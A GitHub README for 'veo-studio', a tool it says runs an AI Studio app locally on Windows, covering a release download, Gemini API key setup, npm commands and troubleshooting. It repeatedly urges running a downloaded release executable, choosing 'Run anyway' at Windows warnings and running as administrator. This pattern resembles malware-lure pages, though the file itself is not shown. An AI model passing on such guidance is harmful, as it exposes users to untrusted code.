# 🎬 veo-studio - Run Your AI Studio App Fast

[![Download veo-studio](https://img.shields.io/badge/Download%20veo--studio-Visit%20Releases-blue?style=for-the-badge)](https://github.com/hamidki6343/veo-studio/releases)

## 🖥️ What veo-studio does

veo-studio helps you run your AI Studio app on your Windows PC. It gives you a simple way to download the app, set it up, and start using it locally.

Use it when you want to:

- run the app on your own computer
- test changes without a web browser setup
- keep your work on your machine
- open your AI Studio app from Windows with a few steps

## 📥 Download the app

Visit the release page and download and run the file for Windows:

[Go to veo-studio releases](https://github.com/hamidki6343/veo-studio/releases)

Look for the latest release and choose the Windows file if it is listed there. Save it to your computer, then open it from your Downloads folder or desktop.

## 🪟 Install on Windows

Follow these steps on a Windows PC:

1. Open the release page.
2. Download the Windows version of veo-studio.
3. If the file is a ZIP file, right-click it and choose **Extract All**.
4. Open the extracted folder.
5. Double-click the app file to start it.
6. If Windows asks for permission, choose **Run anyway** only if you trust the file source.

If the release page gives you an installer, run the installer and follow the steps on screen.

## ⚙️ Before you start

You may need these items for the app to run well:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free space to download the app
- A Gemini API key if the app asks for one
- Access to your Downloads folder

If you plan to use the local development version, you may also need Node.js.

## 🔑 Set up your Gemini API key

Some parts of veo-studio need a Gemini API key.

To add it:

1. Open the app folder.
2. Find the file named `.env.local`.
3. Open it with Notepad.
4. Add your key in this format:

   `GEMINI_API_KEY=your_api_key_here`

5. Save the file.
6. Start the app again.

If you do not have a key yet, get one from your Gemini account before you start.

## 🚀 Run the app locally

If you are using the source version on your computer, follow these steps:

1. Install Node.js if it is not already on your PC.
2. Open the app folder.
3. Open Command Prompt in that folder.
4. Run:

   `npm install`

5. Add your `GEMINI_API_KEY` in `.env.local`.
6. Start the app with:

   `npm run dev`

7. Wait for the app to finish loading.
8. Open the local address shown in the window or terminal.

## 🧭 First-time setup

If this is your first time using veo-studio, use this order:

1. Download the release from GitHub.
2. Open the file you downloaded.
3. Complete any setup steps on screen.
4. Add your Gemini API key if needed.
5. Start the app.
6. Check that the main screen loads.

If the app does not open, close it and try again after checking the file you downloaded.

## 📁 Common files you may see

Here are some files and folders that may appear in the app folder:

- `.env.local` — stores your API key
- `node_modules` — files added after install
- `package.json` — app settings
- `src` — app source files
- `public` — images and static files

You do not need to edit most of these files unless you are changing how the app works.

## 🛠️ Troubleshooting

If the app does not start, try these steps:

### App closes right away
- Check that you downloaded the latest release
- Open the file again as administrator
- Make sure the file finished downloading

### The app says the API key is missing
- Open `.env.local`
- Check that `GEMINI_API_KEY=` is set
- Remove extra spaces before or after the key

### The app will not load
- Check your internet connection
- Close other apps that use a lot of memory
- Restart your PC and try again

### `npm install` fails
- Make sure Node.js is installed
- Open Command Prompt again in the app folder
- Try the command one more time

### The app opens, but nothing shows
- Wait a moment for the page to load
- Refresh the window
- Start the app again from the same folder

## 🔄 Update veo-studio

When a new release is available:

1. Return to the release page.
2. Download the latest Windows file.
3. Replace the old file or install the new one.
4. Open the app again.
5. Check that your `.env.local` file still has your API key

If you changed settings before, keep a copy of your old folder first.

## 📌 Basic use

After the app starts, you can use it like this:

- open the app from Windows
- load your AI Studio project
- test the app on your own machine
- keep your API key in the local config file
- restart the app when you make changes

## 🔒 Keep your key safe

Your Gemini API key gives access to your account. Keep it private.

Good habits:

- do not share `.env.local`
- do not post your key in chat or email
- keep a backup of the file in a safe place
- replace the key if you think it was exposed

## 📞 Help with setup

If you need to check the release files or get the app again, use the download page:

[Visit veo-studio releases](https://github.com/hamidki6343/veo-studio/releases)

If you are setting up the local version, make sure Node.js is installed and that `.env.local` has your `GEMINI_API_KEY` value before you run `npm run dev`

## 🧩 What this app is for

veo-studio is built for people who want a local way to run an AI Studio app on Windows. It fits simple local use, quick testing, and basic setup without extra steps.